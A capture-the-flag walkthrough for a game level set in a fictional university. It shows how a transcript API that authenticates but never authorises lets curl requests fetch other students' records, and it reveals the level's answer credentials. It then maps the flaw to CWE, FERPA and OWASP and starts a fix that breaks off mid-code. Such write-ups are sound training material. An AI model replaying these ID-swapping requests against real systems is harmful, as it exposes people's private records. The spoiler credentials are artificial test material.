# level1@web — Carlos's Login Wall

**Track:** Web · **Client:** Meridian State University · **Compliance regime:** FERPA (20 U.S.C. § 1232g; 34 CFR Part 99) · **Builds on:** [`level0@web`](/walkthroughs/#/web/level0)

> ⚠ This page contains the full solve path **and** the breadcrumb credential for `level2@web`. If you haven't solved `level1@web` yet, close this tab and come back after. The puzzle is much more satisfying without spoilers, and the post-mortem below makes considerably more sense once you've felt the moment yourself.

---

## §1 — The setup

When you left the lobby at the end of `level0@web`, Meridian State University had a clean kind of incident on its hands. Carlos — Meridian's in-house web developer, eight months in role, inheritor of the BluePier Digital mess — had taken yesterday's finding the way you want clients to take findings. The autoindexed `/backup/` directory was gone within the hour. The DB credential rotation got booked into Friday's regular change window. Cedarwood Mutual, Meridian's cyber-insurance carrier, was proactively notified rather than learning about the issue later — and Cedarwood's renewal-review team now had "Meridian discovered and remediated within audit window" as the lead bullet on the renewal worksheet.

This is not the version of consulting where the client is the problem. Carlos is the version where the client is the solution; the agency that left the mess is no longer around to be the problem with.

It was during yesterday's clean-up conversation that Carlos mentioned, almost in passing, a second project he'd shipped recently. He'd been getting recurring tickets from students who needed unofficial transcripts for graduate-school applications and didn't want to wait the registrar's three-business-day turnaround. So three weeks ago he wrote a "quick transcript download" endpoint and bolted it into the student portal. Students log in via Meridian SSO, click a button, and get a PDF (well, a JSON the front-end renders as a PDF). The registrar approved it as a self-service convenience feature; the security review was "it's behind SSO, so anyone calling it is a logged-in student."

Priya did not like the second half of that sentence.

She asked Carlos to send her the verification middleware and a captured SSO session she could use for testing. He sent both before end of day — the same A-plus client behavior he showed on yesterday's finding — and went home. The conversation today is the audit on the second project.

You're logged in as `webapp_admin` on `portal.meridian.edu`. The path that got you here is the same path the credential chain has been running since `level0@web`: the leaked DB credential `M3rid14n!2023-prod` from the BluePier-era `db-creds.txt` is, per the comment in that file, also a shell user on the portal host. The pattern is identical to the network and crypto level1s: a service-account credential that was supposed to be database-scoped grew an interactive login somewhere along the way and nobody reverted it. The shell access itself is its own finding; today's audit is a different finding entirely.

The legal frame hasn't softened. FERPA applies to Meridian — to "education records," which under 34 CFR §99.3 explicitly include transcripts. The enforcement mechanism is "the federal government can withdraw your funding," which for a public university is existential. FERPA does not have a HIPAA-style breach-notification clock, but the Department of Education's Privacy Technical Assistance Center expects "reasonable" notification timing for confirmed disclosures of education records to unauthorized parties, and Meridian's annual Federal Student Aid attestation will include any documented disclosure that happened during the reporting cycle.[^department-of-education-privacy-technical] Today is part of the reporting cycle.

What you don't know yet, walking in, is that Carlos's verification middleware is doing one job (authentication) correctly and skipping the second job (authorization) entirely. The endpoint trusts whatever `student_id` it's asked for and returns whatever transcript matches. Any student with an active Meridian session can pull any other student's transcript. The blast radius is everything in the database's `transcripts` table — every currently-enrolled student, every formerly-enrolled student, and every legacy system account that nobody has gotten around to cleaning up since 2023.

## §2 — The solve

The puzzle path is short. Read fifteen lines of code, decode one cookie, curl four URLs.

### Step 1: Confirm the credential and what it bought you

```bash
guest@d3cyph3r:~$ ssh level1@web
level1@web's password: M3rid14n!2023-prod
Connected: level1@web
webapp_admin@web:~$ whoami
webapp_admin
webapp_admin@web:~$ pwd
/home/webapp_admin
```

You used the still-live DB credential from `level0@web`'s `db-creds.txt`. Same access an attacker pulling the same credential from the same exposed backup directory would have. Same access that prompted Carlos's Friday rotation. You're sitting on `portal.meridian.edu`, the student-portal webapp host, where Carlos's transcript endpoint runs and where the access logs are mirrored for observability.

### Step 2: Read the day-two context

```bash
webapp_admin@web:~$ ls
admin-access.log  is not here.  Try:
id-conventions.md       priya-note.md         transcript-api.js
lessons-learned.md      session.txt           welcome.md
```

Six files. Read them in order.

`welcome.md` is the mechanics file — it walks through what you already know about `curl` and `cookies`, explains the authentication-vs-authorization distinction, and points you at the four files you'll read next. `priya-note.md` is the in-character handoff: the day-two context, what Carlos said about the new endpoint, the rules of engagement (no scripted enumeration), the FERPA compliance hooks. `transcript-api.js` is Carlos's vulnerable code — fifteen lines including imports. `session.txt` is the captured SSO session Carlos sent for testing. `id-conventions.md` is the document Priya put together describing Meridian's student-ID format, including the BluePier-era M-000xxxx legacy range. `lessons-learned.md` is what you'll read after you find what's there.

The critical pieces to extract before you do anything else:

- **No new commands today**: `curl` and `cookies` are the tools. The puzzle is in *how* you use them.
- **The auth model**: the SSO middleware confirms the requester is logged into Meridian. It does not confirm the requester is the *student whose transcript is being requested*. That's the lesson.
- **The legal frame**: same controlled-exception authorization as `level0@web` plus an explicit "do not enumerate at scale" constraint — targeted validation only.

### Step 3: Read Carlos's verify middleware

```bash
webapp_admin@web:~$ cat transcript-api.js
```

The relevant code:

```javascript
import express from "express";
import { requireMeridianSSO } from "./middleware/sso.js";
import { db } from "./db.js";

export const router = express.Router();

// Require an active Meridian SSO session for ALL routes in this router.
router.use(requireMeridianSSO);

router.get("/api/transcript", async (req, res) => {
  const studentId = req.query.student_id;
  if (!studentId) {
    return res.status(400).json({ error: "missing student_id" });
  }

  const transcript = await db.transcripts.findOne({ student_id: studentId });
  if (!transcript) {
    return res.status(404).json({ error: "not found" });
  }

  return res.json(transcript);
});
```

Read it slowly. The middleware on the router does its job — `requireMeridianSSO` populates `req.session` with the authenticated user's identity (`req.session.studentId`, `req.session.email`, etc.) and rejects requests without a valid SSO cookie. That part is correct.

The handler then reads `req.query.student_id` (the URL parameter, user-controlled), looks up the matching transcript in the database, and returns it. The handler **never compares `req.query.student_id` against `req.session.studentId`**. Whatever student_id the caller asks for is the student_id the API responds with — provided the caller is *some* authenticated Meridian user.

The fix is one line. The current code:

```javascript
const studentId = req.query.student_id;
```

would, in a correct implementation, be followed by:

```javascript
if (studentId !== req.session.studentId) {
  return res.status(403).json({ error: "forbidden" });
}
```

(Or, for non-self queries by registrar staff, a role check; or a centralized authz helper that handles both cases.) The check is missing.

### Step 4: Confirm you're authenticated

```bash
webapp_admin@web:~$ cookies https://portal.meridian.edu
```

```
Cookies for: https://portal.meridian.edu
──────────────────────────────────────────
  MeridianSSO          = eyJzaWQiOiJ3ZWJhcHAtc3ZjLW1vbml0b3JpbmctMjAyNiIsImV4cCI6MjA5MTM0MTY0MH0
  csrf                 = Y2RmYTczNGItOWY4Yi00ZWQwLWFhMzgtZjQ4ZTQyZjZkM2Q0

Tip: base64-looking values can be decoded with: base64 -d <value>
```

The session cookie is set. The cookie name (`MeridianSSO`) is the real one — it matches what the middleware reads. The value is base64-encoded JSON; if you decode it you'll see the session ID and expiration. This is the credential the middleware honors.

The captured session is for `webapp-svc-monitoring` — a synthetic account Carlos set up for the nightly health-check job that pings the transcript endpoint to confirm uptime. It's the same shape as a regular Meridian student session; the middleware doesn't distinguish.

### Step 5: Exercise the endpoint against student IDs you already have

You have eight student IDs from yesterday's `students_export_2023.csv` — the BluePier-leaked dataset of 4,217 records. Aisha Patel was `M-1872941`; Marcus Reyes was `M-1872995`; Jordan Smith was `M-1873041`; Linh Tran, Tyler Brooks, Sara Kapoor, Dmitri Volkov, Olivia Chen rounded out the eight. Per Priya's rules of engagement, you curl *a handful* (not the whole list, not scripted) and document what comes back.

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-1872941'
```

```json
{
  "student_id": "M-1872941",
  "first_name": "Aisha",
  "last_name": "Patel",
  "email": "patel.a@meridian.edu",
  "major": "Computer Science",
  "gpa": 3.91,
  "enrollment_status": "Active",
  "courses_completed": [
    {"code": "CS-301", "name": "Algorithms", "term": "Fall 2025", "grade": "A"},
    {"code": "CS-340", "name": "Operating Systems", "term": "Fall 2025", "grade": "A-"},
    {"code": "MATH-220", "name": "Linear Algebra", "term": "Spring 2026", "grade": "A"},
    {"code": "ENGL-202", "name": "Advanced Composition", "term": "Spring 2026", "grade": "B+"}
  ],
  "advisor": "Dr. Maria Sanchez",
  "advisor_notes": "On track for May 2026 graduation. Strong candidate for graduate study; encouraged to apply to CMU and UWashington.",
  "issued_at": "2026-04-09T14:23:00Z"
}
```

Aisha's full transcript came back. Grades, GPA, advisor notes, the courses she's taken — all of it. The session that authenticated the request belongs to `webapp-svc-monitoring`. Aisha's session doesn't enter the picture.

Try another:

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-1873041'
```

```json
{
  "student_id": "M-1873041",
  "first_name": "Jordan",
  "last_name": "Smith",
  "major": "Mechanical Engineering",
  "gpa": 2.88,
  "enrollment_status": "Active — Academic Probation (since Spring 2026)",
  "courses_completed": [
    {"code": "ME-301", "name": "Thermodynamics", "term": "Fall 2025", "grade": "C-"},
    {"code": "ME-302", "name": "Fluid Mechanics", "term": "Spring 2026", "grade": "D+"}
  ],
  "advisor": "Dr. Henry Park",
  "advisor_notes": "Academic probation as of Spring 2026 (GPA fell below 3.0). Recommend tutoring referral + check-in with student wellness.",
  "issued_at": "2026-04-09T14:23:00Z"
}
```

Jordan's transcript. Including his academic-probation status and his advisor's notes about referring him to tutoring and student wellness. None of this is information Jordan would consent to sharing with any other student. The advisor's wellness referral specifically is the kind of detail FERPA treats as sensitive even within the broader education-record category — disability-coded information has additional protections.

The IDOR is confirmed at this point. You don't need to enumerate further to prove the bug. But there's one more class of finding worth surfacing — the legacy ID range.

### Step 6: Read the ID conventions and try a legacy ID

```bash
webapp_admin@web:~$ cat id-conventions.md
```

```
Current students:      M-187xxxx   (issued 2018-onward, sequential
                                    by enrollment date)
Former students:       M-XXXXXXX   (range varies — 100000-999999
                                    depending on enrollment year)
Legacy / system:       M-000xxxx   (BluePier-era, created 2021-2023
                                    for testing, demo accounts,
                                    acceptance-QA scripts, etc.)
```

The legacy range is the interesting one. BluePier left things behind in `/backup/` — the level0 finding. They also left things behind in the database, per Carlos's comment: "We never finished migrating off the legacy M-000xxxx range. They're still in the database. The student-facing UI hides them but the API doesn't filter."

Try the lowest one:

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-0000001'
```

```json
{
  "student_id": "M-0000001",
  "first_name": "Test",
  "last_name": "Student",
  "email": "test@meridian.edu",
  "major": "[SYSTEM ACCOUNT — NOT A REAL STUDENT]",
  "gpa": 4.00,
  "enrollment_status": "Service / QA Account",
  "courses_completed": [],
  "advisor": "BluePier Digital (legacy)",
  "advisor_notes": "BLUEPIER DEMO ACCOUNT — DO NOT DELETE. Created 2023-08-12 by James for transcript-portal acceptance testing. Service account for end-to-end QA: portal-svc / pw=meridian-portal-svc-2026 / used by the automated nightly check that validates the registrar integration. Carlos: don't decommission this yet, the cutover to the new check is scheduled Q4 2024. — James, BluePier 2023-08-12",
  "issued_at": "2026-04-09T14:23:00Z"
}
```

The BluePier demo account is still in the database. Its `advisor_notes` field carries a credential in plain text. The cutover that James referenced was scheduled for Q4 2024 — eighteen months before today's audit — and clearly didn't happen. The service-account credential `meridian-portal-svc-2026` is still live, the demo account is still queryable through the same IDOR vector, and the credential is now in your possession.

This is the level2 breadcrumb. It's there because BluePier needed somewhere to stash the credential during 2023 acceptance testing, picked an `advisor_notes` field on a demo account as "a reasonable place," and never came back to clean up. The same anti-pattern that put Theo's audit-bypass credential in a DNS TXT record back in `level1@network`; the same anti-pattern that put a credential in a JWT payload claim back in `level1@crypto`; the same anti-pattern, three different "convenient places" engineers chose to "just stash it" because the surface they had didn't enforce any access control on what got written into it.

### Step 7: Confirm the API does return 404 for invalid IDs

```bash
webapp_admin@web:~$ curl 'https://portal.meridian.edu/api/transcript?student_id=M-9999999'
```

```json
{"error":"not found"}
```

Not a bug confirmation — a sanity check. The API does distinguish "valid ID, here's the record" from "no such ID." That means the responses you got for Aisha and Jordan and the BluePier demo weren't generic stubs or honeypots; they were genuine database hits. Documentation point worth including in the report.

### Step 8: Document and stop

Per Priya's rules of engagement, you do not iterate the M-187xxxx range. You don't enumerate every legacy ID. You don't try the registrar accounts (M-2xxxxxxx, per the conventions doc — though you didn't try that range to confirm). What you do is write up exactly what the four queries demonstrated.

The minimum report content:

1. **The transcript API performs authentication without authorization.** `requireMeridianSSO` confirms an active Meridian session; the handler does not check that `req.query.student_id` matches `req.session.studentId`. Any logged-in Meridian student (or any party with a valid Meridian session, including service accounts) can request any other student's transcript.
2. **The vulnerability is exploitable at any scale.** Authenticated, unprivileged sessions return data for every record in the `transcripts` table. The validation curl-tests confirmed two real students (Aisha Patel, Jordan Smith) and one legacy demo account (M-0000001).
3. **The IDOR extends to legacy system accounts.** Meridian's `M-000xxxx` ID range still contains BluePier-era demo accounts. The student-facing UI hides them; the API does not filter them out. Their records may contain test data or operational metadata that shouldn't be reachable through an unauthorized API path.
4. **A live service-account credential is published in plain text in a record's `advisor_notes` field.** The BluePier demo account at M-0000001 carries `portal-svc` credential `meridian-portal-svc-2026`. The credential should be rotated and the demo account decommissioned outright.
5. **The `advisor_notes` field is a free-form text field with no schema constraint.** Anything anyone has ever written into it is recoverable through an IDOR-style query. The advisor_notes contents of other student records may contain similar leftovers from BluePier-era data.
6. **Session-token observation**: the captured SSO session's `exp` claim decodes to 2036-04-09, ten years out. Long-lived service-account tokens are a separate finding under NIST SP 800-63B-4 §5 *Session Management* — short-lived tokens with proper refresh are the modern standard.[^nist-800-63b]

Send the report to Carlos with general counsel cc'd. He'll have the fix shipped before lunch.

```bash
webapp_admin@web:~$ exit
```

### Step 9 (game-world only): Use the breadcrumb

In a real engagement, today ends here. In D3CYPH3R the credential chain continues into `level2@web`, where the `portal-svc` account becomes the entry point.

```bash
guest@d3cyph3r:~$ ssh level2@web
level2@web's password: meridian-portal-svc-2026
```

`level2@web` is playable, and its walkthrough picks up from here.

## §3 — The vulnerability

Today's finding looks like one missing line of code. It's actually a couple of failures stacked.

### Failure 1: Authentication without authorization (CWE-639 / CWE-862)

Carlos's middleware confirms the requester is *a* logged-in Meridian user. The handler then trusts whatever resource identifier the URL says — and any logged-in user can request any resource ID. The general weakness pattern is **Insecure Direct Object Reference (IDOR)**: an endpoint takes a resource identifier as input, looks the resource up in the data store, and returns it without verifying the caller's authorization to access that specific resource.

The most precise CWE mapping is **CWE-639: Authorization Bypass Through User-Controlled Key**.[^cwe-639] The catalog entry describes the weakness as "the system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data" — which is Carlos's case described as a definition.

The parent weakness is **CWE-285: Improper Authorization**.[^cwe-285] CWE-285 is the broad umbrella for any case where the authorization decision is wrong or missing.

For the specific failure mode where the authorization check is *entirely absent* (rather than present-but-wrong), **CWE-862: Missing Authorization** is the better fit.[^cwe-862] Carlos's handler doesn't have a broken check; it has no check at all. CWE-862 is a recurring CWE Top 25 entry — it ranked in the upper half on the 2024 edition.

(For completeness: **CWE-863: Incorrect Authorization** is the sibling pattern where the check exists but produces the wrong answer. Carlos's case isn't CWE-863 because there's nothing to be incorrect — the check isn't there.)[^cwe-863]

### Failure 2: The demo account that outlived its purpose

The BluePier `M-0000001` demo account was created for transcript-portal acceptance testing in 2023, scheduled for decommission in Q4 2024, and is still live in 2026. The advisor_notes field for that account contains a service-account credential that was supposed to be migrated to a real secrets manager when the new monitoring system landed. Neither thing happened.

This is the sticky-account anti-pattern documented in NIST SP 800-53 Rev. 5 control AC-2(3) *Disable Accounts* and CIS Critical Security Controls v8.1 sub-control 5.3 *Disable Dormant Accounts*.[^nist-800-53] Same pattern shape as the `audit-bypass.atlas.internal` host in `level1@network` and the `audit-svc` account in that same scenario. Different surface; same failure mode.

### Failure 3: Sensitive data in a free-form text field

The `advisor_notes` field exists for human-readable comments — "encouraged to apply to CMU," "recommend tutoring referral." It was used during BluePier's acceptance testing as a place to stash a credential because "it's just a string field, who's going to look at it on a system account?" The fact that the IDOR turned the JSON record into a publicly-recoverable artifact means anything stashed in any such field — across any record — is recoverable in the same way.

This isn't a single CWE. The pattern shape is **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** (the broad umbrella, currently DISCOURAGED for mapping per the CWE catalog) layered with **CWE-540: Inclusion of Sensitive Information in Source Code** (the literal CWE-540 entry is about source code, but the spirit — "sensitive data should not appear in artifacts whose access control is not credential-grade" — applies).[^cwe-540][^cwe-200] The narrower modern mapping is **CWE-312: Cleartext Storage of Sensitive Information**.[^cwe-312]

### The compound effect

Pull any one thread:

- Add the per-resource authz check → IDOR closes; legacy demo records are still in the database but unreachable via the API; the credential in the advisor_notes is no longer recoverable through the IDOR path.
- Decommission the BluePier demo account → the credential the advisor_notes carries is gone; IDOR still works against current students.
- Move credentials out of free-form fields → IDOR still works, but no credential-class secrets recoverable that way; PII (transcripts) still exposed.

The full remediation tracks each failure independently because each has a different fix and a different timeline. The IDOR fix is one code change shipped this afternoon. The demo-account decommission is a coordination conversation with Carlos and the BluePier successor (or, more likely, a unilateral decision by Carlos because the BluePier successor doesn't exist). The free-form-field cleanup is a schema audit plus a one-shot migration that scrubs known credential patterns from existing data.

## §3.5 — Blast radius

| Dimension | This finding |
|---|---|
| Reached | Carlos's transcript-download endpoint, which authenticates correctly and never authorises |
| Who can exploit it | Any logged-in student, by changing `student_id` in the request |
| Records in scope | Every transcript in the system, which under 34 CFR § 99.3 are education records by name |
| Detectability | Requests are well-formed and authenticated, so they do not look anomalous |
| Escalates to | A BluePier-era demo account whose `advisor_notes` field carries the `level2@web` credential |
| Regime | FERPA education records (no notification duty, no fine schedule); any clock comes from state breach law attaching to the PII |

**Authentication passed. That is what makes this dangerous rather than
obvious.** The middleware does one job correctly and skips the second
entirely. Every request in the logs carries a valid session belonging to
a real, enrolled student, so there is no failed-login spike, no unusual
source, and nothing for a WAF to match. The absence of an alert here is
not evidence that the endpoint was not abused.

**The exposed population is every transcript, not the one you fetched.**
Demonstrating an IDOR on a single record establishes that the control is
missing, and a missing control has no per-record scope. The assessment
should report the finding as full-table reach and let Meridian's log
retention answer the separate question of what was actually taken, if it
can.

**Stale accounts widen the radius past the current roll.** The demo
account left over from the BluePier engagement is still live and still
carries a free-text notes field with a credential in it. Two distinct
failures meet there: an account that should have been removed at project
close, and a habit of parking secrets in fields designed for prose. The
IDOR is what a scanner might eventually find; the demo account is what an
attacker would actually use.

## §4 — Real-world parallels

IDOR is, by several published metrics, the most-disclosed vulnerability class on modern web applications. The pattern keeps appearing because authentication frameworks make it easy to gate access by "logged-in user" and harder to gate by "this specific resource belongs to this specific user." A few named incidents that illustrate the range:

### Thread 1: USPS Informed Visibility (November 2018)

The United States Postal Service ran (and runs) a service called *Informed Visibility*, an API that lets logged-in USPS account holders see mail-tracking data. In November 2018, a security researcher discovered that the API would return mail-tracking data for **any** account holder when an account holder authenticated and asked for someone else's data — there was no check that the authenticated user owned the data being requested.

The Krebs on Security report that broke the story estimated **roughly 60 million** USPS user accounts were exposed via the bug.[^krebs-on-security-usps-site] The data accessible per the Krebs writeup included email addresses, usernames, user IDs, account numbers, street addresses, phone numbers, authorized-users metadata, and mailing-campaign data. USPS confirmed the issue and patched, but the underlying technical pattern — authenticated user, missing per-resource authorization check, predictable account identifiers — was exactly the IDOR shape you just walked through with Carlos's transcript endpoint. The USPS case differs only in scale and in regulated-data category (postal records vs. education records).

### Thread 2: Optus (September 2022)

Optus — Australia's second-largest telecommunications carrier — disclosed in September 2022 that an attacker had exfiltrated personal data on customers via an unauthenticated API endpoint. The technical mechanism was IDOR-adjacent: an API endpoint that returned customer records by ID, with no authentication requirement at all. The attacker incremented through the customer-ID range and pulled records sequentially.

Public figures evolved as the investigation progressed. Optus's own early disclosure named "up to 10 million" affected customers; the OAIC's August 2025 Federal Court civil-penalty filing alleges interference with the privacy of approximately **9.5 million** Australians, with approximately 2.1 million having government-issued ID numbers (driver's licenses, passports, Medicare numbers) exposed. The Australian Federal Police investigation, the single OAIC civil-penalty proceeding filed in August 2025 (alleging contraventions with potential per-contravention penalties up to AUD $2.22 million), and the **AUD ~$140 million** Optus reserved for breach remediation (Equifax Protect subscriptions for affected customers, the Deloitte external review, replacement-document costs) make this one of the most consequential privacy incidents in Australian history.

Optus's case is the *unauthenticated* variant of IDOR — Carlos's endpoint is the *authenticated* variant. The defender's discipline difference: Optus's API had no authentication of any kind; Carlos's has authentication but no authorization. The blast radius shape is the same; the remediation conversation is different.

### Thread 3: T-Mobile API (January 2023)

T-Mobile US disclosed in January 2023 that an attacker had used an API to obtain personal data on approximately **37 million** prepaid and postpaid customers. The exfiltration began in late November 2022 and was detected and stopped in mid-January 2023, an approximately seven-week window. The technical mechanism, per T-Mobile's SEC 8-K disclosure, was abuse of an API endpoint that returned customer records without adequate access controls on the resource being requested.

The OWASP API Security Top 10's framing labels this category **API1:2023 — Broken Object Level Authorization (BOLA)**. T-Mobile's incident is the canonical recent reminder that BOLA at scale, against a high-value data set, produces immediate breach disclosures and regulatory follow-on (the FCC opened an investigation; T-Mobile had previously paid US$350 million to settle a class action stemming from an earlier 2021 breach, so the pattern repetition mattered).

### The base rate

Beyond the named incidents, IDOR / BOLA is consistently one of the highest-frequency vulnerability classes in bug-bounty platform disclosures. HackerOne's recent *Hacker-Powered Security Report* editions place Broken Access Control / Improper Access Control among the top vulnerability categories by reported volume; Bugcrowd's *Inside the Mind of a Hacker* shows similar patterns. The OWASP Foundation has ranked Broken Access Control at #1 in the OWASP Top 10 (2021 and 2025 editions) because the underlying data — collected from a consortium of contributing organizations' application-security data — keeps showing the category at the top.

The reason for the persistence is not technical mystery. The reason is that *authentication* is provided by frameworks and middleware in a roughly turnkey fashion ("add this line, your route is now SSO-gated"), and *authorization* requires per-route logic that varies by resource type and access model. Carlos used the framework's authentication middleware correctly. He just stopped there. That stopping point is the pattern.

## §5 — Frameworks, deep dive

The post-mortem at the bottom of the level (`lessons-learned.md`) walks through the high-level framework mapping. This section expands each with the specific section / control / paragraph identifiers a compliance auditor would cite.

### CWE — Common Weakness Enumeration

**CWE-639: Authorization Bypass Through User-Controlled Key.**[^cwe-639] The most precise weakness ID. The catalog entry describes the weakness as "the system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data." MITRE mapping status: **ALLOWED**.

**CWE-862: Missing Authorization.**[^cwe-862] The variant where the authorization check is entirely absent. Carlos's handler is CWE-862 — the check on `student_id` ownership is missing entirely, not present-but-wrong. MITRE mapping status: **ALLOWED-WITH-REVIEW** (CWE-862 is a Class-level weakness; the catalog recommends reviewing Base-level children before mapping). CWE-862 has been a recurring CWE Top 25 entry, climbing to #9 on the 2024 edition and #4 on the 2025 edition.

**CWE-863: Incorrect Authorization.**[^cwe-863] The sibling weakness where the check exists but produces the wrong answer. Not Carlos's case directly; cited here as the differentiator.

**CWE-285: Improper Authorization.**[^cwe-285] The broad parent for the authorization-failure family. MITRE mapping status: **DISCOURAGED** — the catalog explicitly recommends mappers use CWE-862 *Missing Authorization* or CWE-863 *Incorrect Authorization* (or a narrower variant like CWE-639) instead. CWE-285 is included here as the historical / hierarchy reference only; for surgical analytics, always reach for CWE-862 / CWE-863 / CWE-639.

**CWE-200: Exposure of Sensitive Information to an Unauthorized Actor.** The umbrella for any sensitive-data disclosure. MITRE marks CWE-200 as **DISCOURAGED for mapping** — it's frequently misused as a catch-all when a more specific weakness applies. Use the more specific weakness (CWE-639 / CWE-862 here) and cite CWE-200 only for framework-mapping reference.

**CWE-312: Cleartext Storage of Sensitive Information.**[^cwe-312] Maps the BluePier-demo credential stored in plain text in an `advisor_notes` field. The catalog text covers exactly this case — credential data stored unencrypted in a database field.

### FERPA — 20 U.S.C. § 1232g; 34 CFR Part 99

The Family Educational Rights and Privacy Act and its implementing regulations.

**34 CFR §99.3 — Definitions.** The "education records" definition explicitly includes records that contain information directly related to a student, maintained by an educational agency receiving federal funding. Transcripts (grades, courses, GPA, advisor notes) are the textbook example.

**34 CFR §99.31 — Conditions under which prior consent is not required to disclose information.** The regulation enumerates the specific categories of disclosure permitted without prior written consent (school officials with legitimate educational interest, other schools, parents of dependent students, etc.). An anonymous IDOR-via-authenticated-student-session disclosure is not among the enumerated categories. Each disclosure made via the vulnerable endpoint is a §99.31 violation.

**34 CFR §99.32 — Recordkeeping requirements.** Disclosures (other than to directory parties, school officials, or pursuant to subpoenas) must be recorded — date, party, basis. The IDOR-driven disclosures have none of this; the exposure created an undocumented, undated, untracked disclosure stream.

**34 CFR §99.7 — Annual notification.** Universities must annually notify students of their FERPA rights, including the right to inspect and challenge records. A confirmed IDOR exposure of transcript data is the kind of incident that needs to be referenced in subsequent annual notifications to enrolled students.

**The enforcement mechanism.** FERPA does not have a federal-level civil-penalty schedule. Enforcement is administrative — the Department of Education can find an institution noncompliant and, in extreme cases, suspend the institution's eligibility for Federal Student Aid (the Title IV programs). For public universities, FSA eligibility is existential.

### NIST SP 800-171 Rev. 3

NIST Special Publication 800-171 *Protecting Controlled Unclassified Information (CUI) in Nonfederal Systems and Organizations*, Revision 3 (May 2024 — supersedes Rev. 2).[^nist-800-171] Universities map to this standard for FSA-related CUI handling. The Rev. 3 numbering uses the format 03.xx.xx (three-digit family + two-digit control + optional enhancement).

**03.01.01 — Account Management.** Covers account lifecycle: creation, modification, disabling. The BluePier demo account that outlived its purpose is a direct violation.

**03.01.02 — Access Enforcement.** The system shall enforce approved authorizations for logical access to CUI and system resources in accordance with applicable access-control policies. Carlos's endpoint enforces nothing on the resource side.

**03.01.05 — Least Privilege.** Authorize access for users that is necessary to accomplish assigned tasks. The SSO middleware's authorization scope is "logged in" — too broad for what the transcript endpoint should grant.

### NIST SP 800-53 Rev. 5

The federal control catalog. Applies broadly outside federal scope as the most comprehensive controls reference.

**AC-3 — Access Enforcement.** The system must enforce approved authorizations for logical access. Carlos's endpoint enforces nothing on the resource-ownership dimension; AC-3 is failed.

**AC-6 — Least Privilege.** The SSO-authenticated user has more access than the user's role justifies for the transcript-download use case. The control envisions per-action authorization decisions, not blanket access-by-authentication.

**AC-4 — Information Flow Enforcement.** Information flows between subjects and objects must be controlled. Student records (the objects) are flowing to subjects (other students, service accounts) who shouldn't be receiving them.

**AC-2(3) — Disable Accounts.** The BluePier demo account's continued existence past its scheduled removal date is the violation. AC-2(3) requires disabling accounts no longer needed within an organization-defined time period.

### CIS Critical Security Controls v8.1

The Center for Internet Security's *Critical Security Controls v8.1* (June 2024).

**6.7 — Centralize Access Control.** Manage access control for all enterprise assets through a centralized access management platform. Ad-hoc per-route authorization logic (or no authorization logic, as here) is the opposite of centralized.

**16.10 — Apply Secure Design Principles in Application Architectures.** The control text covers the layered-security model — authentication, authorization, input validation, output encoding, error handling. Carlos's endpoint applies the first layer correctly and skips the second.

**5.3 — Disable Dormant Accounts.** The BluePier demo at M-0000001 has been dormant past the cutover-Q4-2024 schedule. CIS 5.3 calls for explicit periodic review and disabling.

### OWASP

**OWASP Top 10 (2025) — A01: Broken Access Control.**[^owasp-top-10-2025-a01] Held the #1 slot from 2021 to 2025. IDOR is the most-cited example in the category description. The category covers "violation of the principle of least privilege or deny by default," "bypassing access control checks by modifying the URL," and "IDOR (Insecure Direct Object References)." All three apply directly to Carlos's endpoint.

**OWASP API Security Top 10 (2023) — API1: Broken Object Level Authorization (BOLA).**[^owasp-api-security-top-10] OWASP's API-specific Top 10 (last updated in 2023) has had Broken Object Level Authorization as API1 since the list was first published in 2019. The category description names "the most common API attack vector" — IDOR's API expression. The remediation guidance is the same as OWASP A01: check authorization on every resource access, regardless of the authentication state.

### Cloud-native / SDLC frameworks worth knowing

**OWASP ASVS (Application Security Verification Standard) v5.0.**[^owasp-asvs-v5-0-v4] ASVS publishes a verification checklist for application security at three increasing levels. Section V4 *Access Control* explicitly requires (Level 1, the minimum) per-request authorization checks against the authenticated principal. Carlos's endpoint fails V4.1.1 (the trivially obvious one).

**OWASP Cheat Sheet — Authorization.** <https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html>. Walks through the layered model (authentication vs authorization), the centralization pattern, the per-resource-check pattern, and the audit-the-codebase pattern. Read it as a defender; hand it to Carlos.

## §6 — Cert exam relevance

IDOR is taught everywhere. If you study any of the certs below, you've seen the pattern.

**CompTIA Security+ (SY0-701).**[^cert-security-plus] The current exam (released November 2023). Domain 2 (*Threats, Vulnerabilities, and Mitigations*) covers application-layer vulnerabilities including IDOR / Broken Access Control. Domain 3 (*Security Architecture*) covers the authentication-vs-authorization distinction.

**CompTIA PenTest+ (PT0-003).**[^cert-pentest-plus] The current exam (released December 2024, replacing PT0-002 which sunset mid-2025). Domain 3 (*Attacks and Exploits*) names IDOR in the web-application-attack taxonomy and tests candidates' ability to identify and exploit it in hands-on lab scenarios.

**CompTIA CySA+ (CS0-003).**[^cert-cysa] The current exam (released June 2023). Domain 2 (*Threat Intelligence*) covers IDOR detection patterns — log-based detection of cross-user access patterns is a named module.

**(ISC)² CISSP.**[^cert-cissp] Domain 3 (*Security Architecture and Engineering*) — the authentication / authorization distinction is a CISSP fundamental. The CBK chapters on access-control models (DAC, MAC, RBAC, ABAC) all cover the per-resource-check pattern.

**Offensive Security OSWA / OSWE / OSCP.**[^cert-oswe][^cert-oscp] OffSec's web-focused certs spend substantial curriculum time on IDOR. The OSWE exam (Web Expert) includes IDOR-style challenges as a recurring test of the candidate's ability to identify authorization failures in real applications. The OSWA (Web Assessor) covers IDOR exploitation in its initial-attacks module. The OSCP touches IDOR briefly but the deep treatment lives in the web-specific certs.

**SANS GIAC GWAPT (GIAC Web Application Penetration Tester).**[^cert-gwapt] Covers IDOR in depth. The associated course (SEC542) maps IDOR to its OWASP categorization and walks through detection in the labs.

## §7 — What a defender does

The bulleted version is in the in-game `lessons-learned.md`. This section expands each with the specific operational details.

### 1. Fix the endpoint

The minimal fix for Carlos's specific case:

```javascript
router.get("/api/transcript", async (req, res) => {
  const studentId = req.query.student_id;
  if (!studentId) {
    return res.status(400).json({ error: "missing student_id" });
  }

  // Authorization check: the authenticated student can only request
  // their own transcript. Non-self queries require the registrar role.
  if (studentId !== req.session.studentId) {
    if (!req.session.roles?.includes("registrar")) {
